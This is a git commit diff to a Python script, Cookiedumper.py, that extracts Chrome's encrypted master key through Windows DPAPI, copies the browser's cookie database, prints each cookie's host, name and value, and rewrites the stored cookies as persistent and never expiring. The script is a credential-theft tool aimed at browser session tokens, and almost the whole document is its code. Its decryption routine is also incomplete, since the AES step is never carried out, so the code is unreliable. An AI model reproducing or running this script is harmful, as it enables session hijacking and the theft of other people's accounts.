e5dcf2f18398a425ba52e7ae2c37abda39dc30df
Dessmondd <97458634+Dessmondd@users.noreply.github.com>
2023-06-20 02:48:02 +0200

    Update Cookiedumper.py

--- Cookiedumper.py
+++ Cookiedumper.py
@@ -4,59 +4,94 @@ import base64
 import sqlite3
 import shutil
 from datetime import datetime, timedelta
-import win32crypt # pip install pypiwin32
-from Crypto.Cipher import AES # pip install pycryptodome
+import win32crypt  # pip install pypiwin32
+from Crypto.Cipher import AES  # pip install pycryptodome
 
 
 def get_chrome_datetime(chromedate):
     if chromedate != 86400000000 and chromedate:
         try:
-            return datetime (1601, 1, 1) + timedelta(microseconds=chromedate)
+            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
         except Exception as e:
             print(f"Error: Encountered {e}, chromedate: {chromedate}")
-            return  chromedate
-        else:
-            return ""   
-        
+            return chromedate
+    else:
+        return ""
+
+
 def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google" , "Chrome", "User Data", "Local State")
-    
+    local_state_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "Local State"
+    )
+
     with open(local_state_path, "r") as f:
         local_state = f.read()
-        local_state = json.loads(local_state)    
+        local_state = json.loads(local_state)
 
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    key = key [5:]
-    return win32crypt.CryptUnprotectData(key, None, None , None, 0)[1]
+    key = key[5:]
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
-def decrypt_data(data,key):
+
+def decrypt_data(data, key):
     try:
-        iv: data[3:15]
+        iv = data[3:15]
         data = data[15:]
-        
     except:
         try:
-            return str(win32crypt.CryptUnprotectData(data, None,None, None,0)[1])
+            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
         except:
             return ""
-def main():
-    db_path = os.path.join(os.environ["USERPROFILE"]"AppData", "Local", "Google" , "Chrome", "User Data",)
-    filename = "Cookies.db"
-    if not os.path.isfile(filename):
-        shutil.copyfile(db_path, filename)
 
-db = sqlite3.connect(filename)
-db.text_factory = lambda b: b.decode(errors="ignore")
-cursor = db.cursor()
-cursor.execute("""
-    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
-    FROM cookies""")
+
+def main():
+    db_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "Default"
+    )
+    filename = "Cookies.db"
+    source_file = os.path.join(db_path, "Network")
+
+    if not os.path.isfile(source_file):
+        print("Cookies file not found.")
+        return
+
+    shutil.copyfile(source_file, filename)
+
+    db = sqlite3.connect(filename)
+    db.text_factory = lambda b: b.decode(errors="ignore")
+    cursor = db.cursor()
+    cursor.execute("""
+        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
+        FROM cookies""")
+
     key = get_encryption_key()
-    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
+
+    for (
+        host_key,
+        name,
+        value,
+        creation_utc,
+        last_access_utc,
+        expires_utc,
+        encrypted_value
+    ) in cursor.fetchall():
         if not value:
             decrypted_value = decrypt_data(encrypted_value, key)
         else:
             decrypted_value = value
+
         print(f"""
         Host: {host_key}
         Cookie name: {name}
@@ -66,10 +101,18 @@ cursor.execute("""
         Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
         ===============================================================
         """)
+
         cursor.execute("""
-        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
-        WHERE host_key = ?
-        AND name = ?""", (decrypted_value, host_key, name))
+            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
+            WHERE host_key = ?
+            AND name = ?""",
+            (decrypted_value, host_key, name))
+
     db.commit()
     db.close()
+
+
+if __name__ == "__main__":
+    main()
+
     
